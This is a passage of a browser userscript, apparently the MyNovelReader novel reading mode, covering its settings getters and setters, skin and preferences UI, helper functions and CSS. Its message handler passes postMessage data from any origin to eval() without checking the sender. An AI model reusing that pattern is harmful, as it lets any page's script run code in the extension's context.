            App.working = false;
        },
        fixImageFloats: function (articleContent) {
            if(!config.fixImageFloats) return;

            articleContent = articleContent || document;

            var imageWidthThreshold = Math.min(articleContent.offsetWidth, 800) * 0.55,
                images = articleContent.querySelectorAll('img:not(.blockImage)');

            for(var i=0, il = images.length; i < il; i+=1) {
                var image = images[i];

                if(image.offsetWidth > imageWidthThreshold) {
                    image.className += " blockImage";
                }
            }
        }
    };

    var Config = {
        get disable_auto_launch() {  // 强制手动启用模式
            return this._getBooleanConfig("disable_auto_launch", false);
        },
        set disable_auto_launch(bool) {
            GM_setValue("disable_auto_launch", bool);
        },

        get booklink_enable() {  // booklink.me 跳转的自动启动
            return this._getBooleanConfig("booklink_enable", true);
        },
        set booklink_enable(bool) {
            GM_setValue("booklink_enable", bool);
        },

        get debug() {  // 调试
            return this._getBooleanConfig("debug", false);
        },
        set debug(bool) {
            GM_setValue("debug", bool);
        },

        get addToHistory() {
            if (_.isUndefined(this._addToHistory)) {
                this._addToHistory = this._getBooleanConfig("add_nextpage_to_history", true);
            }
            return this._addToHistory;
        },
        set addToHistory(bool) {
            this._addToHistory = bool;
            GM_setValue("add_nextpage_to_history", bool);
        },

        get dblclickPause() {
            return this._getBooleanConfig('dblclick_pause', true);
        },
        set dblclickPause(bool) {
            GM_setValue('dblclick_pause', bool);
        },

        get remain_height() {  // 距离底部多少高度（px）开始加载下一页
            if(!this._remain_height){
                this._remain_height = parseInt(GM_getValue("remain_height"), 10) || 1000;
            }
            return this._remain_height;
        },
        set remain_height(val) {
            GM_setValue("remain_height", val);
            this._remain_height = val;
        },

        get font_family() {
            return GM_getValue("font_family") || "微软雅黑,宋体,黑体,楷体";
        },
        set font_family(val) {
            GM_setValue("font_family", val);
        },

        get font_size() {  // 字体大小
            return GM_getValue("font_size") || "18px";
        },
        set font_size(val) {
            GM_setValue("font_size", val);
        },

        get text_line_height(){
            return GM_getValue("text_line_height") || "2.25em";
        },
        set text_line_height(val){
            GM_setValue("text_line_height", val);
        },

        get content_width() {  // 内容宽度
            return GM_getValue("content_width") || "800px";
        },
        set content_width(val) {
            GM_setValue("content_width", val);
        },

        get extra_css() {
            return GM_getValue("extra_css") || "";
        },
        set extra_css(val) {
            GM_setValue("extra_css", val);
        },

        get customSiteinfo() {
            return GM_getValue('custom_siteinfo') || '[]';
        },
        set customSiteinfo(val) {
            GM_setValue('custom_siteinfo', val);
        },

        get skin_name() {
            return GM_getValue("skin_name") || "缺省皮肤";
        },
        set skin_name(val) {
            GM_setValue("skin_name", val);
        },

        get menu_list_hiddden() {
            return this._getBooleanConfig("menu_list_hiddden", false);
        },
        set menu_list_hiddden(bool) {
            GM_setValue("menu_list_hiddden", bool);
        },

        get menu_bar_hidden() {
            return this._getBooleanConfig("menu_bar_hidden", false);
        },
        set menu_bar_hidden(bool) {
            GM_setValue("menu_bar_hidden", bool);
        },

        get hide_footer_nav() {
            return this._getBooleanConfig("hide_footer_nav", true);
        },
        set hide_footer_nav(bool) {
            GM_setValue("hide_footer_nav", bool);
            UI.hideFooterNavStyle(bool);
        },

        get hide_preferences_button() {
            return this._getBooleanConfig("hide_preferences_button", false);
        },
        set hide_preferences_button(bool) {
            GM_setValue('hide_preferences_button', bool);
        },

        // 安静模式
        get isQuietMode() {
            return this._getBooleanConfig("is_quiet_mode", false);
        },
        set isQuietMode(bool) {
            GM_setValue("is_quiet_mode", bool);
        },

        // 快捷键
        // 打开设置窗口的快捷键
        get openPreferencesKey() {
            if (this._openPreferencesKey) {
                return this._openPreferencesKey;
            }
            return this._openPreferencesKey = GM_getValue('open_preferences_key') || 's';
        },
        set openPreferencesKey(keyCode) {
            this._openPreferencesKey = keyCode;
            GM_setValue('open_preferences_key', keyCode);
        },
        get openPreferencesKeyCode() {
            return this.openPreferencesKey.toUpperCase().charCodeAt(0);
        },

        // 隐藏左侧章节列表的快捷键
        get hideMenuListKey() {  // 默认为 c
            // 'C'.charCodeAt(0) = 67
            if (this._hideMenuListKey) {
                return this._hideMenuListKey;
            }
            return this._hideMenuListKey = GM_getValue('hide_menulist_key') || 'c';
        },
        set hideMenuListKey(key) {
            this._hideMenuListKey = key;
            GM_setValue("hide_menulist_key", key);
        },
        get hideMenuListKeyCode() {
            return this.hideMenuListKey.toUpperCase().charCodeAt(0);
        },

        _getBooleanConfig: function(configName, defaultValue) {
            var config = GM_getValue(configName);
            if(config === undefined) {
                GM_setValue(configName, defaultValue);
                config = defaultValue;
            }
            return config;
        }
    };

    var UI = {
        tpl_footer_nav: '<div class="chapter-footer-nav">\
                <a class="prev-page" href="{prevUrl}">上一页</a> | \
                <a class="index-page" href="{indexUrl}" title="Enter 键打开目录">目录</a> | \
                <a class="next-page" style="color:{theEndColor}" href="{nextUrl}">下一页</a>\
            </div>\
        ',
        skins: {
            "缺省皮肤": "",
            "暗色皮肤": "body { color: #666; background: rgba(0,0,0,.1); }\
                .title { color: #222; }",
            "白底黑字": "body { color: #333; background: white;}\
                .title { font-weight: bold; border-bottom: 0.1em solid; margin-bottom: 1.857em; padding-bottom: 0.857em;}",
            "夜间模式": "body { color: #e3e3e3; background: #2d2d2d; } #preferencesBtn { background: white; }",
            "橙色背景": "body { color: #24272c; background: #FEF0E1; }",
            "绿色背景": "body { color: #333; background: #d8e2c8; }",
            "绿色背景2": "body { color: #333; background: #CCE8CF; }",
            "蓝色背景": "body { color: #333; background: #E7F4FE; }",
            "棕黄背景": "body { color: #333; background: #C2A886; }",
            "经典皮肤": "body { color: #333; background-color: #EAEAEE; }\
                .title { background: #f0f0f0; }",
        },

        init: function(){
            UI.refreshMainStyle();

            UI.refreshSkinStyle(Config.skin_name);

            UI.refreshExtraStyle(Config.extra_css);

            UI.fixMobile();

            // 初始化是否隐藏
            if(Config.hide_footer_nav){
                UI.hideFooterNavStyle(true);
            }

            // UI.toggleQuietMode();  // 初始化安静模式
            UI.hideMenuList(Config.menu_list_hiddden);  // 初始化章节列表是否隐藏
            UI.hidePreferencesButton(Config.hide_preferences_button);  // 初始化设置按钮是否隐藏
        },
        refreshMainStyle: function(){
            if(UI.mainStyle){
                $(UI.mainStyle).remove();
            }

            UI.mainStyle = GM_addStyle(
                CSS_MAIN
                    .replace("{font_family}", Config.font_family)
                    .replace("{font_size}", Config.font_size)
                    .replace("{title_font_size}", UI.calcTitleFontSize(Config.font_size))
                    .replace("{content_width}", Config.content_width)
                    .replace("{text_line_height}", Config.text_line_height)
                    .replace("{menu-bar-hidden}", Config.menu_bar_hidden ? "display:none;" : "")
            );
        },
        hideFooterNavStyle: function(hidden){
            var navStyle = $("#footer_nav_css");
            if(hidden) {
                if(navStyle.length === 0) {
                    $('<style>')
                        .attr("id", "footer_nav_css")
                        .text(".chapter-footer-nav { display: none; }")
                        .appendTo('head');
                }
            } else {
                navStyle.remove();
            }
        },
        hideMenuList: function(hidden){
            if(typeof(hidden) === "undefined"){
                hidden = !UI.menu_list_hiddden;
            }

            if(hidden){
                App.$menu.addClass('hidden');
                App.$content.css("margin-left", "");
            }else{
                App.$menu.removeClass('hidden');
                App.$content.css("margin-left", "320px");
            }
            UI.menu_list_hiddden = hidden;
        },
        hidePreferencesButton: function(hidden) {
            hidden = _.isUndefined(hidden) ? Config.hide_preferences_button : hidden;
            
            App.$preferencesBtn.toggle(!hidden);
        },
        hideMenuBar: function(hidden) {
            hidden = _.isUndefined(hidden) ? Config.menu_bar_hidden : hidden;
            
            App.$menuBar.toggle(!hidden);
        },
        refreshSkinStyle: function(skin_name){
            var style = $("#skin_style");
            if(style.length === 0){
                style = $('<style id="skin_style">').appendTo('head');
            }

            style.text(UI.skins[skin_name]);
        },
        refreshExtraStyle: function(css){
            var style = $("#extra_style");
            if(style.length === 0){
                style = $('<style id="extra_style">').appendTo('head');
            }

            style.text(css);
        },
        toggleQuietMode: function(isQuietMode) {
            if (_.isUndefined(isQuietMode)){
                isQuietMode = Config.isQuietMode;
            }
            
            if (isQuietMode) {
                $('#menu-bar, #menu').addClass("quiet-mode");
            } else {
                $('#menu-bar, #menu').removeClass("quiet-mode");
            }
        },
        addButton: function(){
            GM_addStyle('\
                .readerbtn {\
                    position: fixed;\
                    right: 10px;\
                    bottom: 10px;\
                    z-index: 1597;\
                    padding: 20px 5px;\
                    width: 50px;\
                    height: 20px;\
                    line-height: 20px;\
                    text-align: center;\
                    border: 1px solid;\
                    border-color: #888;\
                    border-radius: 50%;\
                    background: rgba(0,0,0,.5);\
                    color: #FFF;\
                    font: 12px/1.5 "微软雅黑","宋体",Arial;\
                    cursor: pointer;\
                }\
            ');

            $("<div>")
                .addClass("readerbtn")
                .html(App.isEnabled ? "退出" : "阅读模式")
                .mousedown(function(event){
                    if(event.which == 1){
                        App.toggle();
                    }else if(event.which == 2){
                        event.preventDefault();
                        L_setValue("booklinkme_disable_once", true);
                        GM_openInTab(App.activeUrl || App.curPageUrl);
                    }
                })
                .appendTo('body');
        },
        calcTitleFontSize: function(contentFontSizeStr){
            var m = contentFontSizeStr.match(/([\d\.]+)(px|em|pt)/);
            if(m) {
                var size = m[1],
                    type = m[2];
                return parseInt(size, 10) * 1.88 + type;
            }

            return "";
        },
        fixMobile: function(){  // 自适应网页设计
            var meta = document.createElement("meta");
            meta.setAttribute("name", "viewport");
            meta.setAttribute("content", "width=device-width, initial-scale=1");
            document.head.appendChild(meta);
        },
        preferencesCSS: '\
            .body {\
                color:#333;\
                margin: 0 auto;\
                background: white;\
                padding: 10px;\
            }\
            #top-buttons {\
                background: none repeat scroll 0% 0% rgb(255, 255, 255);\
                display: block;\
                position: absolute;\
                top: -35px;\
                border-right: 12px solid rgb(224, 224, 224);\
                border-top: 12px solid rgb(224, 224, 224);\
                border-left: 12px solid rgb(224, 224, 224);\
                text-align: center;\
            }\
            input {\
                font-size: 12px;\
                margin-right: 3px;\
                vertical-align: middle;\
            }\
            .form-row {\
                overflow: hidden;\
                padding: 8px 12px;\
                margin-top: 3px;\
                font-size: 11px;\
                border-bottom: 1px solid rgb(238, 238, 238);\
                border-right: 1px solid rgb(238, 238, 238);\
            }\
            .form-row label {\
                padding-right: 10px;\
            }\
            .form-row input {\
                vertical-align: middle;\
                margin-top: 0px;\
            }\
            textarea, .form-row input {\
                padding: 2px 4px;\
                border: 1px solid #e5e5e5;\
                background: #fff;\
                border-radius: 4px;\
                color: #666;\
                -webkit-transition: all linear .2s;\
                transition: all linear .2s;\
            }\
            textarea {\
                width: 450px;\
                height: 100px;\
                overflow: auto;\
                vertical-align: top;\
            }\
            textarea:focus, input:focus {\
                border-color: #99baca;\
                outline: 0;\
                background: #f5fbfe;\
                color: #666;\
            }\
            ',
        preferencesHTML: '\
            <form id="preferences" class="aligned" name="preferences">\
                <span id="top-buttons">\
                    <input title="部分选项需要刷新页面才能生效" id="save_button" value="√ 确认" type="button">\
                    <input title="取消本次设定，所有选项还原" id="close_button" value="X 取消" type="button">\
                </span>\
                <div class="form-row">\
                    <label title="不影响 booklink.me 的启用">\
                        <input type="checkbox" id="disable-auto-launch" name="disable-auto-launch"/>强制手动启用\
                    </label>\
                    <label title="booklink.me 点击的网站强制启用">\
                        <input type="checkbox" id="booklink-enable" name="booklink-enable"/>booklink 自动启用\
                    </label>\
                    <label>\
                        <input type="checkbox" id="debug" name="debug"/>调试模式\
                    </label>\
                </div>\
                <div class="form-row">\
                    <label title="通过快捷键切换">\
                        <input type="checkbox" id="hide-menu-list"/>隐藏左侧章节列表\
                    </label>\
                    <label>\
                        <input type="checkbox" id="hide-footer-nav"/>隐藏底部导航栏\
                    </label>\
                </div>\
                <div class="form-row">\
                    <label>\
                        <input type="checkbox" id="hide-menu-bar"/>隐藏左侧导航条\
                    </label>\
                    <label>\
                        <input type="button" id="setHideMenuListKey" style="color:red" />\
                    </label>\
                    <label title="通过快捷键切换或在 Greasemonkey 用户脚本命令处打开设置窗口">\
                        <input type="checkbox" id="hide-preferences-button"/>隐藏设置按钮\
                    </label>\
                    <label>\
                        <input type="button" id="openPreferences" style="color:red" />\
                    </label>\
                </div>\
                <div class="form-row" style="display:none">\
                    <label>\
                        <input type="checkbox" id="quietMode"/>安静模式\
                    </label>\
                    <label>\
                        调用阅读器\
                        <input type="button" id="launchReader" style="color:red" />\
                    </label>\
                </div>\
                <div class="form-row">\
                    <label>\
                        距离底部\
                        <input type="textbox" id="remain-height" name="remain-height" size="5"/>\
                        px 加载下一页\
                    </label>\
                    <label>\
                        <input type="checkbox" id="add-nextpage-to-history"/>添加下一页到历史记录\
                    </label>\
                    <label>\
                        <input type="checkbox" id="enable-dblclick-pause"/>双击暂停翻页\
                    </label>\
                </div>\
                <div class="form-row">\
                    <label>\
                        <select id="skin">\
                        </select>\
                    </label>\
                    <label>\
                        字体\
                        <input type="textbox" id="font-family" style="width:250px;"/>\
                    </label>\
                    <br/><br/>\
                    <label>\
                        字体大小\
                        <input type="textbox" id="font-size" name="font-size" size="6"/>\
                    </label>\
                    <label>\
                        行高\
                        <input type="textbox" id="text_line_height" size="6"/>\
                    </label>\
                    <label>\
                        行宽\
                        <input type="textbox" id="content_width" size="6"/>\
                    </label>\
                </div>\
                <div>\
                    自定义样式\
                    <textarea id="extra_css" name="extra_css" placeholder="自定义样式"></textarea>\
                </div>\
                <div>\
                    自定义站点规则\
                    <textarea id="custom_siteinfo" placeholder="自定义站点规则" />\
                </div>\
            </form>',
        preferencesShow: function(event){
            if(event){
                try {  // Greasemonkey 从菜单点击会错误
                    event.preventDefault();
                    event.stopPropagation();
                }catch(ex) {}
            }

            if($("#reader_preferences").length){
                return;
            }

            this._loadBlocker();
            UI.$prefs = $('<div id="reader_preferences">')
                .css('cssText', 'position:fixed; top:12%; left:30%; width:500px; z-index:30000;')
                .append(
                    $('<style>').text(this.preferencesCSS))
                .append(
                    $('<div class="body">').html(this.preferencesHTML))
                .appendTo("body");

            UI.preferencesLoadHandler();
        },
        _loadBlocker: function() {
            if (UI.blocker == null) {
                UI.blocker = $('<div>').attr({
                    id: 'uil_blocker',
                    style: 'position:fixed;top:0px;left:0px;right:0px;bottom:0px;background-color:#000;opacity:0.5;z-index:10000;'
                }).appendTo($('body'));
            }
        },
        hide: function(){
            if(UI.$prefs) UI.$prefs.remove();
            if(UI.blocker) UI.blocker.remove();
            UI.$prefs = null;
            UI.blocker = null;
        },
        preferencesLoadHandler: function(){
            var $form = $("#preferences");

            // checkbox
            $form.find("#disable-auto-launch").get(0).checked = Config.disable_auto_launch;
            $form.find("#booklink-enable").get(0).checked = Config.booklink_enable;
            $form.find("#debug").get(0).checked = Config.debug;
            $form.find("#quietMode").get(0).checked = Config.isQuietMode;
            $form.find("#hide-menu-list").get(0).checked = Config.menu_list_hiddden;
            $form.find("#hide-menu-bar").get(0).checked = Config.menu_bar_hidden;
            $form.find("#hide-footer-nav").get(0).checked = Config.hide_footer_nav;
            $form.find("#hide-preferences-button").get(0).checked = Config.hide_preferences_button;
            $form.find("#add-nextpage-to-history").get(0).checked = Config.addToHistory;
            $form.find("#enable-dblclick-pause").get(0).checked = Config.dblclickPause;

            $form.find("#font-family").get(0).value = Config.font_family;
            $form.find("#font-size").get(0).value = Config.font_size;
            $form.find("#content_width").get(0).value = Config.content_width;
            $form.find("#text_line_height").get(0).value = Config.text_line_height;

            $form.find("#remain-height").get(0).value = Config.remain_height;
            $form.find("#extra_css").get(0).value = Config.extra_css;
            $form.find("#custom_siteinfo").get(0).value = Config.customSiteinfo;

            // 皮肤
            var $skin = $form.find("#skin");
            for(var key in UI.skins){
                $("<option>").text(key).appendTo($skin);
            }
            $skin.val(Config.skin_name).change(function(){
                var key = $(this).find("option:selected").text();
                UI.refreshSkinStyle(key);
                Config.skin_name = key;
            });

            // 字体大小等预览
            var preview = _.debounce(function(){
                switch(this.id){
                    case "font-size":
                        var titleFontSize = UI.calcTitleFontSize(this.value);
                        if(titleFontSize) {
                            App.$content.css("font-size", this.value);
                            App.$content.find("h1").css("font-size", titleFontSize);
                        }
                        break;
                    case "font-family":
                        App.$content.css("font-family", this.value);
                        break;
                    case "content_width":
                        App.$content.css("width", this.value);
                        break;
                    case "text_line_height":
                        App.$content.css("line-height", this.value);
                        break;
                    default:
                        break;
                }
                // UI.refreshMainStyle();
            }, 300);
            $form.on("input", "input", preview);

            // 初始化设置按键
            $form.find("#openPreferences").get(0).value = Config.openPreferencesKey;
            $form.find("#setHideMenuListKey").get(0).value = Config.hideMenuListKey;

            // 点击事件
            $form.on('click', 'input:checkbox, input:button', function(event){
                UI.preferencesClickHandler(event.target);
            });
        },
        preferencesClickHandler: function(target){
            switch (target.id) {
                case 'close_button':
                    UI.preferencesCloseHandler();
                    break;
                case 'save_button':
                    UI.preferencesSaveHandler();
                    break;
                case 'debug':
                    debug = target.checked ? console.log.bind(console) : function() {};
                    break;
                case 'quietMode':
                    UI.toggleQuietMode(target.checked);
                    break;
                case 'hide-menu-list':
                    UI.hideMenuList(target.checked);
                    break;
                case 'hide-preferences-button':
                    UI.hidePreferencesButton(target.checked);
                    if (target.checked) {
                        alert('隐藏后通过快捷键或 Greasemonkey 用户脚本命令处调用');
                    }
                    break;
                case 'hide-menu-bar':
                    UI.hideMenuBar(target.checked);
                    break;
                case 'hide-footer-nav':
                    break;
                case 'openPreferences':
                    var key = prompt('请输入打开设置的快捷键：', Config.openPreferencesKey);
                    if (key) {
                        Config.openPreferencesKey = key;
                        $(target).val(key);
                    }
                    break;
                case 'setHideMenuListKey':
                    var key = prompt('请输入切换左侧章节列表的快捷键：', Config.hideMenuListKey);
                    if (key) {
                        Config.hideMenuListKey = key;
                        $(target).val(key);
                    }
                    break;
                default:
                    break;
            }
        },
        preferencesCloseHandler: function(){
            // App.$content.removeAttr("style");
            App.$content.find("h1").css("font-size", "");

            UI.hide();
        },
        preferencesSaveHandler: function(){
            var $form = $("#preferences");

            Config.disable_auto_launch = $form.find("#disable-auto-launch").get(0).checked;
            Config.booklink_enable = $form.find("#booklink-enable").get(0).checked;
            Config.isQuietMode = $form.find("#quietMode").get(0).checked;
            Config.debug = $form.find("#debug").get(0).checked;
            Config.addToHistory = $form.find("#add-nextpage-to-history").get(0).checked;
            Config.dblclickPause = $form.find("#enable-dblclick-pause").get(0).checked;

            Config.skin_name = $form.find("#skin").find("option:selected").text();
            Config.font_family = $form.find("#font-family").get(0).value;
            App.$content.css("font-family", Config.font_family);

            Config.font_size = $form.find("#font-size").get(0).value;
            Config.text_line_height = $form.find("#text_line_height").get(0).value;
            Config.content_width = $form.find("#content_width").get(0).value;
            Config.remain_height = $form.find("#remain-height").get(0).value;

            Config.menu_list_hiddden = $form.find("#hide-menu-list").get(0).checked;
            UI.hideMenuList(Config.menu_list_hiddden);

            Config.menu_bar_hidden = $form.find("#hide-menu-bar").get(0).checked;
            Config.hide_footer_nav = $form.find("#hide-footer-nav").get(0).checked;
            Config.hide_preferences_button = $form.find("#hide-preferences-button").get(0).checked;

            var css = $form.find("#extra_css").get(0).value;
            UI.refreshExtraStyle(css);
            Config.extra_css = css;

            Config.customSiteinfo = $form.find("#custom_siteinfo").get(0).value;

            UI.hide();
        },
        notice: function (htmlText){
            var $noticeDiv = $("#alert");

            clearTimeout(UI.noticeDivto);
            $noticeDiv.find("p").html(htmlText);
            $noticeDiv.fadeIn("fast");

            UI.noticeDivto = setTimeout(function(){
                $noticeDiv.fadeOut(500);
            },1666);

            return $noticeDiv;
        }
    };

    var db;
    window.postMessage("fromeMyNovelReader.post", "*");
    window.addEventListener('message', function(e) {
        if (db) return;
        var data = e.data;
        if (typeof data == 'string' && data.indexOf('MyNovelReader.db') === 0) {

            window.removeEventListener('message',arguments.callee,false);
            window.postMessage("fromeMyNovelReader.remove", "*");

            data = data.slice(16);
            try{
                db = eval( "(" + data + ")" );
            }catch(e) {}

            for(var key in db.config){
                config[key] = db.config[key];
            }

            if(db.SITE_INFO)
                rule.specialSite = db.SITE_INFO.concat(rule.specialSite);

            if(db.css)
                css = db.css;

            debug("接收到 MyNovelReader.db 数据");

            window.addEventListener("DOMContentLoaded", App.init, false);
        }
    }, false);


    window.addEventListener("DOMContentLoaded", function(){
        App.init()
    }, false);

    // 再次检查是否运行，用上面的方式在 Chrome 下有时候无法触发事件
    // window.addEventListener("load" 方法在 Chrome 下可能会找不到内容
    // 下面的方法也不行，Chrome 的加载方式特殊，会找不到内容。
    // if (isChrome) {
    //     function launch_ready(delayedNrTimes) {
    //         if (!App.isLaunched && document.readyState != 'complete' && !document.body && delayedNrTimes < 30) {
    //             setTimeout(function() {
    //                 launch_ready(delayedNrTimes + 1);
    //             }, 100);
    //             return;
    //         }

    //         console.log(document.body.innerHTML)
    //         App.init();
    //     }

    //     launch_ready(0);
    // }

    // 为了防止 Error: Scriptish access violation: unsafeWindow cannot call: GM_getValue
    //     详见 http://wiki.greasespot.net/Greasemonkey_access_violation
    unsafeWindow.readx = function(){
        fakeTimeout(function(){
            App.launch();
        });
    };

    function fakeTimeout(callback) {
      // Register event listener
      window.document.body.addEventListener("timeoutEvent", callback, false);
      // Generate and dispatch synthetic event
      var ev = document.createEvent("HTMLEvents");
      ev.initEvent("timeoutEvent", true, false);
      window.document.body.dispatchEvent(ev);
    }


    //------------------- 辅助函数 ----------------------------------------
    var debug = Config.debug ? console.log.bind(console) : function() {};

    function L_getValue(key) {
        try{
            return localStorage.getItem(key);
        }catch(e) {}
    }
    function L_setValue(key, value) {
        try{
            localStorage.setItem(key, value);
        }catch(e) {}
    }
    function L_removeValue(key){
        try{
            localStorage.removeItem(key);
        }catch(e) {}
    }

    // jQuery text 完全匹配. e.g. a:econtains('最新章节')
    $.expr[":"].econtains = function(obj, index, meta, stack) {
        return (obj.textContent || obj.innerText || $(obj).text() || "").toLowerCase() == meta[3].toLowerCase();
    };

    function nano(template, data) {
        return template.replace(/\{([\w\.]*)\}/g, function(str, key) {
            var keys = key.split("."),
                v = data[keys.shift()];
            for (var i = 0, l = keys.length; i < l; i++) v = v[keys[i]];
            return (typeof v !== "undefined" && v !== null) ? v : "";
        });
    }

    function createDocumentByString(str) {
        var doc
        try {
             doc = new DOMParser().parseFromString(str, "text/html");
        }catch(ex){}

        if (!doc) {
            doc = document.implementation.createHTMLDocument("");
            doc.querySelector("html").innerHTML = str;
        }
        return doc;
    }

    function toRE(obj) {
        if (obj instanceof RegExp) {
            return obj;
        } else {
            return new RegExp(obj, 'ig');
        }
    }

    /*
     * jQuery Easing v1.3 - http://gsgd.co.uk/sandbox/jquery/easing/
     */
    jQuery.easing.jswing=jQuery.easing.swing,jQuery.extend(jQuery.easing,{def:"easeOutQuad",swing:function(a,b,c,d,e){return jQuery.easing[jQuery.easing.def](a,b,c,d,e)},easeInQuad:function(a,b,c,d,e){return d*(b/=e)*b+c},easeOutQuad:function(a,b,c,d,e){return-d*(b/=e)*(b-2)+c},easeInOutQuad:function(a,b,c,d,e){return(b/=e/2)<1?d/2*b*b+c:-d/2*(--b*(b-2)-1)+c},easeInCubic:function(a,b,c,d,e){return d*(b/=e)*b*b+c},easeOutCubic:function(a,b,c,d,e){return d*((b=b/e-1)*b*b+1)+c},easeInOutCubic:function(a,b,c,d,e){return(b/=e/2)<1?d/2*b*b*b+c:d/2*((b-=2)*b*b+2)+c},easeInQuart:function(a,b,c,d,e){return d*(b/=e)*b*b*b+c},easeOutQuart:function(a,b,c,d,e){return-d*((b=b/e-1)*b*b*b-1)+c},easeInOutQuart:function(a,b,c,d,e){return(b/=e/2)<1?d/2*b*b*b*b+c:-d/2*((b-=2)*b*b*b-2)+c},easeInQuint:function(a,b,c,d,e){return d*(b/=e)*b*b*b*b+c},easeOutQuint:function(a,b,c,d,e){return d*((b=b/e-1)*b*b*b*b+1)+c},easeInOutQuint:function(a,b,c,d,e){return(b/=e/2)<1?d/2*b*b*b*b*b+c:d/2*((b-=2)*b*b*b*b+2)+c},easeInSine:function(a,b,c,d,e){return-d*Math.cos(b/e*(Math.PI/2))+d+c},easeOutSine:function(a,b,c,d,e){return d*Math.sin(b/e*(Math.PI/2))+c},easeInOutSine:function(a,b,c,d,e){return-d/2*(Math.cos(Math.PI*b/e)-1)+c},easeInExpo:function(a,b,c,d,e){return 0==b?c:d*Math.pow(2,10*(b/e-1))+c},easeOutExpo:function(a,b,c,d,e){return b==e?c+d:d*(-Math.pow(2,-10*b/e)+1)+c},easeInOutExpo:function(a,b,c,d,e){return 0==b?c:b==e?c+d:(b/=e/2)<1?d/2*Math.pow(2,10*(b-1))+c:d/2*(-Math.pow(2,-10*--b)+2)+c},easeInCirc:function(a,b,c,d,e){return-d*(Math.sqrt(1-(b/=e)*b)-1)+c},easeOutCirc:function(a,b,c,d,e){return d*Math.sqrt(1-(b=b/e-1)*b)+c},easeInOutCirc:function(a,b,c,d,e){return(b/=e/2)<1?-d/2*(Math.sqrt(1-b*b)-1)+c:d/2*(Math.sqrt(1-(b-=2)*b)+1)+c},easeInElastic:function(a,b,c,d,e){var f=1.70158,g=0,h=d;return 0==b?c:1==(b/=e)?c+d:(g||(g=.3*e),h<Math.abs(d)?(h=d,f=g/4):f=g/(2*Math.PI)*Math.asin(d/h),-(h*Math.pow(2,10*(b-=1))*Math.sin((b*e-f)*2*Math.PI/g))+c)},easeOutElastic:function(a,b,c,d,e){var f=1.70158,g=0,h=d;return 0==b?c:1==(b/=e)?c+d:(g||(g=.3*e),h<Math.abs(d)?(h=d,f=g/4):f=g/(2*Math.PI)*Math.asin(d/h),h*Math.pow(2,-10*b)*Math.sin((b*e-f)*2*Math.PI/g)+d+c)},easeInOutElastic:function(a,b,c,d,e){var f=1.70158,g=0,h=d;return 0==b?c:2==(b/=e/2)?c+d:(g||(g=e*.3*1.5),h<Math.abs(d)?(h=d,f=g/4):f=g/(2*Math.PI)*Math.asin(d/h),1>b?-.5*h*Math.pow(2,10*(b-=1))*Math.sin((b*e-f)*2*Math.PI/g)+c:.5*h*Math.pow(2,-10*(b-=1))*Math.sin((b*e-f)*2*Math.PI/g)+d+c)},easeInBack:function(a,b,c,d,e,f){return void 0==f&&(f=1.70158),d*(b/=e)*b*((f+1)*b-f)+c},easeOutBack:function(a,b,c,d,e,f){return void 0==f&&(f=1.70158),d*((b=b/e-1)*b*((f+1)*b+f)+1)+c},easeInOutBack:function(a,b,c,d,e,f){return void 0==f&&(f=1.70158),(b/=e/2)<1?d/2*b*b*(((f*=1.525)+1)*b-f)+c:d/2*((b-=2)*b*(((f*=1.525)+1)*b+f)+2)+c},easeInBounce:function(a,b,c,d,e){return d-jQuery.easing.easeOutBounce(a,e-b,0,d,e)+c},easeOutBounce:function(a,b,c,d,e){return(b/=e)<1/2.75?d*7.5625*b*b+c:2/2.75>b?d*(7.5625*(b-=1.5/2.75)*b+.75)+c:2.5/2.75>b?d*(7.5625*(b-=2.25/2.75)*b+.9375)+c:d*(7.5625*(b-=2.625/2.75)*b+.984375)+c},easeInOutBounce:function(a,b,c,d,e){return e/2>b?.5*jQuery.easing.easeInBounce(a,2*b,0,d,e)+c:.5*jQuery.easing.easeOutBounce(a,2*b-e,0,d,e)+.5*d+c}});

})('\
    body > a { display:none !important; } /*临时解决措施，找不到原因*/ \
    .hidden {\
        display: none;\
    }\
    .quiet-mode {\
        display: none;\
    }\
    body {\
        background: #F3F2EE;\
        color: #1F0909;\
        padding: 0px;\
        margin: 0px;\
        font-family: "Microsoft YaHei UI", 微软雅黑, 新宋体, 宋体, arial;\
    }\
    a { color: #065488; }\
    a:link { text-decoration: none; }\
    #mynovelreader-content {\
        width: {content_width};\
        font-size: {font_size};\
        font-family: {font_family};\
        line-height: {text_line_height};\
        margin-left:auto;\
        margin-right:auto;\
        padding-bottom: 15px;\
    }\
    article {\
        margin-top: 55px;\
        word-wrap: break-word;\
    }\
    article h1 {\
        clear: both;\
        line-height: 50px;\
        font-size: {title_font_size};\
        font-weight: normal;\
        margin: 25px -20px;\
        padding: 0 20px 10px;\
        border-bottom: 1px solid rgba(0,0,0,.25);\
        font-weight: normal;\
        text-transform: none;\
    }\
    .chapter-footer-nav {\
        text-align:center;\
        font-size:0.9em;\
        margin:-10px 0px 30px 0px;\
    }\
    #loading {\
        color: white;\
        text-align: center;\
        font: 12px "微软雅黑", "宋体", "Times New Roman", "Verdana";\
        margin-top: 20px;\
        margin-left: auto;\
        margin-right: auto;\
        width: 376px;\
        height: 32px;\
        line-height: 32px;\
        border-radius: 20px;\
        border: 1px solid #666;\
        background-color: #333;\
    }\
    #loading img {\
        vertical-align: middle;\
    }\
    #loading a {\
        color: white;\
    }\
    #preferencesBtn{\
        position: fixed;\
        top: 10px;\
        right: 10px;\
        z-index: 1597;\
    }\
    #alert {\
        position: fixed;\
        z-index: 100;\
        float: auto;\
        width: auto;\
        height: auto;\
        top: 10px;\
        left: 500px;\
        background: rgba(215, 240, 253, 0.65);\
        color: #2d7091;\
        border: 1px solid rgba(45,112,145,0.3);\
        border-radius: 4px;\
        text-shadow: 0 1px 0 #fff;\
    }\
    #alert p {\
        font-size: 13px;\
        margin: 6px;\
    }\
    img.blockImage {clear: both;float: none;display: block;margin-left: auto;margin-right: auto;}\
    #menu-bar {\
        border: solid rgba(0, 100, 255, .9);\
        border-width: 3px 2px 3px 0px;\
        position: fixed;\
        left: 0px;\
        top: 40%;\
        height: 100px;\
        width: 2px;\
        z-index: 199;\
        {menu-bar-hidden}\
    }\
    #menu {\
        position: fixed;\
        top: 0;\
        bottom: 0;\
        left: 0;\
        z-index: 100;\
        width: 270px;\
        max-width: 100%;\
        background: #333;\
        overflow-y: auto;\
    }\
    #menu:after {\
        content: "";\
        display: block;\
        position: absolute;\
        top: 46px;\
        bottom: 0;\
        right: 0;\
        width: 1px;\
        background: rgba(0,0,0,0.6);\
        box-shadow: 0 0 5px 2px rgba(0,0,0,0.6);\
    }\
    #header{\
        color: #777;\
        margin-top: 0;\
